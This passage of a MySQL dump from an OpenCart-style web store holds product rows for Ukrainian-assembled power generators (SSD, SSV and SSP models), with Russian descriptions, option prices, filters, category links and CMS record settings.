СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSD - 200','',''),(80,3,'SSD - 200','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 200','',''),(80,4,'SSD - 200','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 200','',''),(81,4,'SSD - 240','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 240','',''),(81,1,'SSD - 240','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSD - 240','',''),(81,3,'SSD - 240','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 240','',''),(82,4,'SSD - 280','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 280','',''),(82,1,'SSD - 280','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSD - 280','',''),(82,3,'SSD - 280','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 280','',''),(83,4,'SSD - 320','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 320','',''),(83,1,'SSD - 320','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSD - 320','',''),(83,3,'SSD - 320','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 320','',''),(84,3,'SSD - 360','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 360','',''),(84,4,'SSD - 360','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 360','',''),(84,1,'SSD - 360','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSD - 360','',''),(85,3,'SSD - 400','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 400','',''),(85,4,'SSD - 400','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 400','',''),(85,1,'SSD - 400','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSD - 400','',''),(86,3,'SSV - 80','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 80','',''),(86,4,'SSV - 80','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 80','',''),(86,1,'SSV - 80','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSV - 80','',''),(87,3,'SSV - 100','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 100','',''),(87,4,'SSV - 100','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 100','',''),(87,1,'SSV - 100','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSV - 100','',''),(88,3,'SSV - 120','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 120','',''),(88,4,'SSV - 120','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 120','',''),(88,1,'SSV - 120','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSV - 120','',''),(89,3,'SSV - 150','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 150','',''),(89,4,'SSV - 150','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 150','',''),(89,1,'SSV - 150','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSV - 150','',''),(90,3,'SSV - 200','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 200','',''),(90,4,'SSV - 200','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 200','',''),(90,1,'SSV - 200','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSV - 200','',''),(91,3,'SSV - 280','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 280','',''),(91,4,'SSV - 280','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 280','',''),(91,1,'SSV - 280','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSV - 280','',''),(92,3,'SSV - 320','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 320','',''),(92,4,'SSV - 320','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 320','',''),(92,1,'SSV - 320','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSV - 320','',''),(93,3,'SSV - 360','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 360','',''),(93,4,'SSV - 360','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 360','',''),(93,1,'SSV - 360','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSV - 360','',''),(94,3,'SSV - 400','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 400','',''),(94,4,'SSV - 400','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 400','',''),(94,1,'SSV - 400','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSV - 400','',''),(95,3,'SSV - 450','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 450','',''),(95,4,'SSV - 450','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 450','',''),(95,1,'SSV - 450','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSV - 450','',''),(96,3,'SSV - 500','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 500','',''),(96,4,'SSV - 500','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 500','',''),(96,1,'SSV - 500','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSV - 500','',''),(97,3,'SSP - 16','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSP - 16','',''),(97,4,'SSP - 16','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSP - 16','',''),(97,1,'SSP - 16','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSP - 16','',''),(98,1,'SSV - 80','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSV - 80','',''),(98,3,'SSV - 80','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 80','',''),(98,4,'SSV - 80','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSV - 80','','');
/*!40000 ALTER TABLE `oc_product_description` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_product_discount` WRITE;
/*!40000 ALTER TABLE `oc_product_discount` DISABLE KEYS */;
INSERT INTO `oc_product_discount` VALUES (551,42,1,30,1,'66.0000','0000-00-00','0000-00-00'),(550,42,1,20,1,'77.0000','0000-00-00','0000-00-00'),(549,42,1,10,1,'88.0000','0000-00-00','0000-00-00');
/*!40000 ALTER TABLE `oc_product_discount` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_product_filter` WRITE;
/*!40000 ALTER TABLE `oc_product_filter` DISABLE KEYS */;
INSERT INTO `oc_product_filter` VALUES (42,1),(42,6),(50,2),(52,3),(53,3),(54,4),(55,4),(56,5),(57,5),(58,5),(59,1),(60,1),(61,1),(62,1),(63,2),(64,2),(65,2),(66,3),(67,3),(68,3),(69,4),(70,1),(71,1),(72,1),(73,2),(74,2),(75,3),(76,3),(77,4),(78,3),(79,4),(80,5),(81,5),(82,5),(83,5),(84,5),(85,5),(86,3),(87,4),(88,4),(89,4),(90,5),(91,5),(92,5),(93,5),(94,5),(95,5),(96,5),(97,1),(98,3);
/*!40000 ALTER TABLE `oc_product_filter` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_product_image` WRITE;
/*!40000 ALTER TABLE `oc_product_image` DISABLE KEYS */;
INSERT INTO `oc_product_image` VALUES (2616,42,'catalog/demo/compaq_presario.jpg',0),(2615,42,'catalog/demo/hp_1.jpg',0),(2614,42,'catalog/demo/canon_eos_5d_1.jpg',0),(2613,42,'catalog/demo/canon_eos_5d_2.jpg',0),(2612,42,'catalog/demo/canon_logo.jpg',0);
/*!40000 ALTER TABLE `oc_product_image` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_product_option` WRITE;
/*!40000 ALTER TABLE `oc_product_option` DISABLE KEYS */;
INSERT INTO `oc_product_option` VALUES (248,70,1,'',1),(220,42,10,'2011-02-20 22:25',1),(218,42,1,'',1),(219,42,8,'2011-02-20',1),(222,42,7,'',1),(208,42,4,'test',1),(223,42,2,'',1),(209,42,6,'',1),(221,42,9,'22:25',1),(217,42,5,'',1),(229,50,1,'',1),(230,52,1,'',1),(231,53,1,'',1),(232,54,1,'',1),(233,55,1,'',1),(234,56,1,'',1),(235,57,1,'',1),(236,58,1,'',1),(237,59,1,'',1),(238,60,1,'',1),(239,61,1,'',1),(240,62,1,'',1),(241,63,1,'',1),(242,64,1,'',1),(243,65,1,'',1),(244,66,1,'',1),(245,67,1,'',1),(246,68,1,'',1),(247,69,1,'',1),(249,71,1,'',1),(250,72,1,'',1),(251,73,1,'',1),(252,74,1,'',1),(253,75,1,'',1),(254,76,1,'',1),(255,77,1,'',1),(256,78,1,'',1),(257,79,1,'',1),(258,80,1,'',1),(259,81,1,'',1),(260,82,1,'',1),(261,83,1,'',1),(262,84,1,'',1),(263,85,1,'',1),(264,86,1,'',1),(265,87,1,'',1),(266,88,1,'',1),(267,89,1,'',1),(268,90,1,'',1),(269,91,1,'',1),(270,92,1,'',1),(271,93,1,'',1),(272,94,1,'',1),(273,95,1,'',1),(274,96,1,'',1),(275,97,1,'',1),(276,98,1,'',1);
/*!40000 ALTER TABLE `oc_product_option` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_product_option_value` WRITE;
/*!40000 ALTER TABLE `oc_product_option_value` DISABLE KEYS */;
INSERT INTO `oc_product_option_value` VALUES (7,218,42,1,43,300,1,'30.0000','+',3,'+','30.00000000','+'),(5,218,42,1,32,96,1,'10.0000','+',1,'+','10.00000000','+'),(6,218,42,1,31,146,1,'20.0000','+',2,'-','20.00000000','+'),(10,223,42,2,44,2696,1,'30.0000','+',0,'+','30.00000000','+'),(62,248,70,1,31,100,1,'1200.0000','+',0,'+','0.00000000','+'),(63,248,70,1,43,100,0,'220.0000','+',0,'+','0.00000000','+'),(11,223,42,2,45,3998,1,'40.0000','+',0,'+','40.00000000','+'),(8,223,42,2,23,48,1,'10.0000','+',0,'+','10.00000000','+'),(3,217,42,5,40,300,0,'3.0000','+',0,'+','3.00000000','+'),(9,223,42,2,24,194,1,'20.0000','+',0,'+','20.00000000','+'),(4,217,42,5,39,92,1,'4.0000','+',0,'+','4.00000000','+'),(2,217,42,5,42,200,1,'2.0000','+',0,'+','2.00000000','+'),(1,217,42,5,41,100,0,'1.0000','+',0,'+','1.00000000','+'),(24,229,50,1,31,100,0,'0.0000','+',0,'+','0.00000000','+'),(29,231,53,1,31,100,1,'0.0000','+',0,'+','0.00000000','+'),(27,230,52,1,31,100,1,'0.0000','+',0,'+','0.00000000','+'),(28,231,53,1,43,100,1,'0.0000','+',0,'+','0.00000000','+'),(25,229,50,1,43,100,0,'0.0000','+',0,'+','0.00000000','+'),(26,230,52,1,43,100,0,'0.0000','+',0,'+','0.00000000','+'),(30,232,54,1,43,100,0,'0.0000','+',0,'+','0.00000000','+'),(31,232,54,1,31,100,1,'0.0000','+',0,'+','0.00000000','+'),(33,233,55,1,43,100,0,'0.0000','+',0,'+','0.00000000','+'),(32,233,55,1,31,100,1,'0.0000','+',0,'+','0.00000000','+'),(34,234,56,1,31,100,1,'0.0000','+',0,'+','0.00000000','+'),(35,234,56,1,43,100,0,'0.0000','+',0,'+','0.00000000','+'),(36,235,57,1,43,100,0,'0.0000','+',0,'+','0.00000000','+'),(37,235,57,1,31,100,1,'0.0000','+',0,'+','0.00000000','+'),(39,236,58,1,43,100,0,'0.0000','+',0,'+','0.00000000','+'),(38,236,58,1,31,100,1,'0.0000','+',0,'+','0.00000000','+'),(40,237,59,1,43,100,0,'0.0000','+',0,'+','0.00000000','+'),(41,237,59,1,31,100,1,'0.0000','+',0,'+','0.00000000','+'),(43,238,60,1,43,100,0,'0.0000','+',0,'+','0.00000000','+'),(42,238,60,1,31,100,1,'0.0000','+',0,'+','0.00000000','+'),(45,239,61,1,31,100,1,'0.0000','+',0,'+','0.00000000','+'),(44,239,61,1,43,100,0,'0.0000','+',0,'+','0.00000000','+'),(46,240,62,1,43,100,0,'0.0000','+',0,'+','0.00000000','+'),(47,240,62,1,31,100,1,'0.0000','+',0,'+','0.00000000','+'),(48,241,63,1,31,100,1,'0.0000','+',0,'+','0.00000000','+'),(49,241,63,1,43,100,0,'0.0000','+',0,'+','0.00000000','+'),(50,242,64,1,43,100,0,'0.0000','+',0,'+','0.00000000','+'),(51,242,64,1,31,100,1,'0.0000','+',0,'+','0.00000000','+'),(52,243,65,1,31,100,1,'0.0000','+',0,'+','0.00000000','+'),(53,243,65,1,43,100,0,'0.0000','+',0,'+','0.00000000','+'),(54,244,66,1,43,100,0,'0.0000','+',0,'+','0.00000000','+'),(55,244,66,1,31,100,1,'0.0000','+',0,'+','0.00000000','+'),(56,245,67,1,31,100,1,'0.0000','+',0,'+','0.00000000','+'),(57,245,67,1,43,100,0,'0.0000','+',0,'+','0.00000000','+'),(59,246,68,1,43,100,0,'0.0000','+',0,'+','0.00000000','+'),(58,246,68,1,31,100,1,'0.0000','+',0,'+','0.00000000','+'),(60,247,69,1,43,100,0,'0.0000','+',0,'+','0.00000000','+'),(61,247,69,1,31,100,1,'0.0000','+',0,'+','0.00000000','+'),(65,249,71,1,43,100,0,'300.0000','+',0,'+','0.00000000','+'),(64,249,71,1,31,100,1,'1200.0000','+',0,'+','0.00000000','+'),(66,250,72,1,43,100,0,'1200.0000','+',0,'+','0.00000000','+'),(67,250,72,1,31,100,1,'400.0000','+',0,'+','0.00000000','+'),(68,251,73,1,43,100,0,'1200.0000','+',0,'+','0.00000000','+'),(69,251,73,1,31,100,1,'650.0000','+',0,'+','0.00000000','+'),(70,252,74,1,43,100,0,'650.0000','+',0,'+','0.00000000','+'),(71,252,74,1,31,100,1,'1350.0000','+',0,'+','0.00000000','+'),(72,253,75,1,31,100,1,'1350.0000','+',0,'+','0.00000000','+'),(73,253,75,1,43,100,0,'650.0000','+',0,'+','0.00000000','+'),(74,254,76,1,43,100,0,'900.0000','+',0,'+','0.00000000','+'),(75,254,76,1,31,100,1,'1350.0000','+',0,'+','0.00000000','+'),(76,255,77,1,31,100,1,'1350.0000','+',0,'+','0.00000000','+'),(77,255,77,1,43,100,0,'1100.0000','+',0,'+','0.00000000','+'),(78,256,78,1,43,100,0,'1380.0000','+',0,'+','0.00000000','+'),(79,256,78,1,31,100,1,'1500.0000','+',0,'+','0.00000000','+'),(80,257,79,1,31,100,1,'1500.0000','+',0,'+','0.00000000','+'),(81,257,79,1,43,100,0,'1380.0000','+',0,'+','0.00000000','+'),(83,258,80,1,31,100,1,'1800.0000','+',0,'+','0.00000000','+'),(82,258,80,1,43,100,0,'1500.0000','+',0,'+','0.00000000','+'),(84,259,81,1,43,100,0,'1900.0000','+',0,'+','0.00000000','+'),(85,259,81,1,31,100,1,'1800.0000','+',0,'+','0.00000000','+'),(86,260,82,1,31,100,1,'1800.0000','+',0,'+','0.00000000','+'),(87,260,82,1,43,100,0,'1900.0000','+',0,'+','0.00000000','+'),(88,261,83,1,43,100,0,'1900.0000','+',0,'+','0.00000000','+'),(89,261,83,1,31,100,1,'2000.0000','+',0,'+','0.00000000','+'),(90,262,84,1,31,100,1,'2000.0000','+',0,'+','0.00000000','+'),(91,262,84,1,43,100,0,'2300.0000','+',0,'+','0.00000000','+'),(92,263,85,1,43,100,0,'2300.0000','+',0,'+','0.00000000','+'),(93,263,85,1,31,100,1,'2000.0000','+',0,'+','0.00000000','+'),(95,264,86,1,31,100,1,'1500.0000','+',0,'+','0.00000000','+'),(94,264,86,1,43,100,0,'900.0000','+',0,'+','0.00000000','+'),(97,265,87,1,43,100,0,'1100.0000','+',0,'+','0.00000000','+'),(96,265,87,1,31,100,1,'1500.0000','+',0,'+','0.00000000','+'),(99,266,88,1,31,100,1,'1500.0000','+',0,'+','0.00000000','+'),(98,266,88,1,43,100,0,'1380.0000','+',0,'+','0.00000000','+'),(101,267,89,1,43,100,0,'1380.0000','+',0,'+','0.00000000','+'),(100,267,89,1,31,100,1,'1500.0000','+',0,'+','0.00000000','+'),(103,268,90,1,31,100,1,'1800.0000','+',0,'+','0.00000000','+'),(102,268,90,1,43,100,0,'1500.0000','+',0,'+','0.00000000','+'),(105,269,91,1,43,100,0,'1900.0000','+',0,'+','0.00000000','+'),(104,269,91,1,31,100,1,'1800.0000','+',0,'+','0.00000000','+'),(106,270,92,1,43,100,0,'1900.0000','+',0,'+','0.00000000','+'),(107,270,92,1,31,100,1,'3000.0000','+',0,'+','0.00000000','+'),(108,271,93,1,31,100,1,'3000.0000','+',0,'+','0.00000000','+'),(109,271,93,1,43,100,0,'2300.0000','+',0,'+','0.00000000','+'),(110,272,94,1,43,100,0,'2300.0000','+',0,'+','0.00000000','+'),(111,272,94,1,31,100,1,'3000.0000','+',0,'+','0.00000000','+'),(112,273,95,1,31,100,1,'3000.0000','+',0,'+','0.00000000','+'),(113,273,95,1,43,100,0,'2300.0000','+',0,'+','0.00000000','+'),(114,274,96,1,43,100,0,'2300.0000','+',0,'+','0.00000000','+'),(115,274,96,1,31,100,1,'3000.0000','+',0,'+','0.00000000','+'),(116,275,97,1,43,100,0,'300.0000','+',0,'+','0.00000000','+'),(117,275,97,1,31,100,1,'1200.0000','+',0,'+','0.00000000','+'),(118,276,98,1,31,100,1,'1500.0000','+',0,'+','0.00000000','+'),(119,276,98,1,43,100,0,'900.0000','+',0,'+','0.00000000','+');
/*!40000 ALTER TABLE `oc_product_option_value` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_product_recurring` WRITE;
/*!40000 ALTER TABLE `oc_product_recurring` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_product_recurring` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_product_related` WRITE;
/*!40000 ALTER TABLE `oc_product_related` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_product_related` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_product_reward` WRITE;
/*!40000 ALTER TABLE `oc_product_reward` DISABLE KEYS */;
INSERT INTO `oc_product_reward` VALUES (603,42,1,100);
/*!40000 ALTER TABLE `oc_product_reward` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_product_special` WRITE;
/*!40000 ALTER TABLE `oc_product_special` DISABLE KEYS */;
INSERT INTO `oc_product_special` VALUES (478,42,1,1,'90.0000','0000-00-00','0000-00-00');
/*!40000 ALTER TABLE `oc_product_special` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_product_to_category` WRITE;
/*!40000 ALTER TABLE `oc_product_to_category` DISABLE KEYS */;
INSERT INTO `oc_product_to_category` VALUES (42,66),(50,72),(52,72),(53,72),(54,72),(55,72),(56,72),(57,72),(58,72),(59,72),(60,72),(61,72),(62,72),(63,72),(64,72),(65,72),(66,72),(67,72),(68,72),(69,72),(70,72),(71,72),(72,72),(73,72),(74,72),(75,72),(76,72),(77,72),(78,72),(79,72),(80,72),(81,72),(82,72),(83,72),(84,72),(85,72),(86,72),(87,72),(88,72),(89,72),(90,72),(91,72),(92,72),(93,72),(94,72),(95,72),(96,72),(97,72),(98,72);
/*!40000 ALTER TABLE `oc_product_to_category` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_product_to_download` WRITE;
/*!40000 ALTER TABLE `oc_product_to_download` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_product_to_download` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_product_to_layout` WRITE;
/*!40000 ALTER TABLE `oc_product_to_layout` DISABLE KEYS */;
INSERT INTO `oc_product_to_layout` VALUES (42,0,0),(70,0,0),(50,0,0),(53,0,0),(52,0,0),(54,0,0),(55,0,0),(56,0,0),(57,0,0),(58,0,0),(59,0,0),(60,0,0),(61,0,0),(62,0,0),(63,0,0),(64,0,0),(65,0,0),(66,0,0),(67,0,0),(68,0,0),(69,0,0),(71,0,0),(72,0,0),(73,0,0),(74,0,0),(75,0,0),(76,0,0),(77,0,0),(78,0,0),(79,0,0),(80,0,0),(81,0,0),(82,0,0),(83,0,0),(84,0,0),(85,0,0),(86,0,0),(87,0,0),(88,0,0),(89,0,0),(90,0,0),(91,0,0),(92,0,0),(93,0,0),(94,0,0),(95,0,0),(96,0,0),(97,0,0),(98,0,0);
/*!40000 ALTER TABLE `oc_product_to_layout` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_product_to_store` WRITE;
/*!40000 ALTER TABLE `oc_product_to_store` DISABLE KEYS */;
INSERT INTO `oc_product_to_store` VALUES (42,0),(50,0),(52,0),(53,0),(54,0),(55,0),(56,0),(57,0),(58,0),(59,0),(60,0),(61,0),(62,0),(63,0),(64,0),(65,0),(66,0),(67,0),(68,0),(69,0),(70,0),(71,0),(72,0),(73,0),(74,0),(75,0),(76,0),(77,0),(78,0),(79,0),(80,0),(81,0),(82,0),(83,0),(84,0),(85,0),(86,0),(87,0),(88,0),(89,0),(90,0),(91,0),(92,0),(93,0),(94,0),(95,0),(96,0),(97,0),(98,0);
/*!40000 ALTER TABLE `oc_product_to_store` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_rate_comment` WRITE;
/*!40000 ALTER TABLE `oc_rate_comment` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_rate_comment` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_rate_review` WRITE;
/*!40000 ALTER TABLE `oc_rate_review` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_rate_review` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_record` WRITE;
/*!40000 ALTER TABLE `oc_record` DISABLE KEYS */;
INSERT INTO `oc_record` VALUES (1,0,'',1,1,1,0,'','a:8:{s:6:\"status\";s:1:\"1\";s:10:\"status_reg\";s:1:\"0\";s:10:\"status_now\";s:1:\"0\";s:6:\"rating\";s:1:\"0\";s:6:\"signer\";s:1:\"1\";s:5:\"order\";s:4:\"sort\";s:8:\"order_ad\";s:4:\"desc\";s:10:\"rating_num\";s:0:\"\";}',0,0,0,'2016-02-28 05:01:06','2033-03-03 00:00:00','2016-02-28 05:01:29','2016-03-01 02:00:49',111),(2,0,'',1,1,1,0,'','a:8:{s:6:\"status\";s:1:\"1\";s:10:\"status_reg\";s:1:\"0\";s:10:\"status_now\";s:1:\"0\";s:6:\"rating\";s:1:\"0\";s:6:\"signer\";s:1:\"1\";s:5:\"order\";s:4:\"sort\";s:8:\"order_ad\";s:4:\"desc\";s:10:\"rating_num\";s:0:\"\";}',0,0,0,'2016-02-28 10:51:58','2033-03-03 00:00:00','2016-02-28 10:53:47','2016-03-28 16:29:06',89),(3,0,'',1,1,1,0,'','a:8:{s:6:\"status\";s:1:\"1\";s:10:\"status_reg\";s:1:\"0\";s:10:\"status_now\";s:1:\"0\";s:6:\"rating\";s:1:\"0\";s:6:\"signer\";s:1:\"1\";s:5:\"order\";s:4:\"sort\";s:8:\"order_ad\";s:4:\"desc\";s:10:\"rating_num\";s:0:\"\";}',0,0,0,'2016-02-28 10:54:47','2033-03-03 00:00:00','2016-02-28 10:56:39','2016-03-28 16:30:06',248),(6,6,'',1,1,1,0,'','a:8:{s:6:\"status\";s:1:\"1\";s:10:\"status_reg\";s:1:\"0\";s:10:\"status_now\";s:1:\"0\";s:6:\"rating\";s:1:\"0\";s:6:\"signer\";s:1:\"1\";s:5:\"order\";s:4:\"sort\";s:8:\"order_ad\";s:4:\"desc\";s:10:\"rating_num\";s:0:\"\";}',0,0,0,'2016-02-29 14:13:32','2033-03-03 00:00:00','2016-02-29 14:13:56','2016-07-28 20:25:33',78),(7,7,'',1,1,1,0,'','a:8:{s:6:\"status\";s:1:\"1\";s:10:\"status_reg\";s:1:\"0\";s:10:\"status_now\";s:1:\"0\";s:6:\"rating\";s:1:\"0\";s:6:\"signer\";s:1:\"1\";s:5:\"order\";s:4:\"sort\";s:8:\"order_ad\";s:4:\"desc\";s:10:\"rating_num\";s:0:\"\";}',0,0,0,'2016-03-01 14:19:02','2033-03-03 00:00:00','2016-03-01 15:19:47','0000-00-00 00:00:00',0),(8,8,'',1,1,1,0,'','a:8:{s:6:\"status\";s:1:\"1\";s:10:\"status_reg\";s:1:\"0\";s:10:\"status_now\";s:1:\"0\";s:6:\"rating\";s:1:\"0\";s:6:\"signer\";s:1:\"1\";s:5:\"order\";s:4:\"sort\";s:8:\"order_ad\";s:4:\"desc\";s:10:\"rating_num\";s:0:\"\";}',0,0,0,'2016-03-12 12:02:51','2033-03-03 00:00:00','2016-03-12 16:03:02','2016-03-12 19:58:46',25),(9,8,'',2,1,1,0,'','a:8:{s:6:\"status\";s:1:\"1\";s:10:\"status_reg\";s:1:\"0\";s:10:\"status_now\";s:1:\"0\";s:6:\"rating\";s:1:\"0\";s:6:\"signer\";s:1:\"1\";s:5:\"order\";s:4:\"sort\";s:8:\"order_ad\";s:4:\"desc\";s:10:\"rating_num\";s:0:\"\";}',0,0,0,'2016-03-12 16:18:28','2033-03-03 00:00:00','2016-03-12 16:25:45','2016-03-12 